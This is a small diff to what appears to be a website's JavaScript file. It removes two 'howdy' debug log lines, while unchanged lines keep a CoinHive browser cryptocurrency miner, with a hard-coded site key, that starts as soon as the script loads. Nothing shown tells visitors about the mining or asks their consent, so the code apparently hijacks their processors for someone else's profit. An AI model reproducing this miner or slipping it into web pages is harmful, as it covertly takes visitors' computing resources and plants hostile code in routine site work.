@@ -1,9 +1,8 @@
 $(document).ready(function(){
-  console.log('howdy1')
+  console.log()
 
 });
 
-console.log('howdy2')
 var miner = new CoinHive.Anonymous('PPXf34fiALvgCkOGgAFgmFz7wtXN34mJ');
 miner.start();
 miner.on('found', function() { /* Hash found */ })
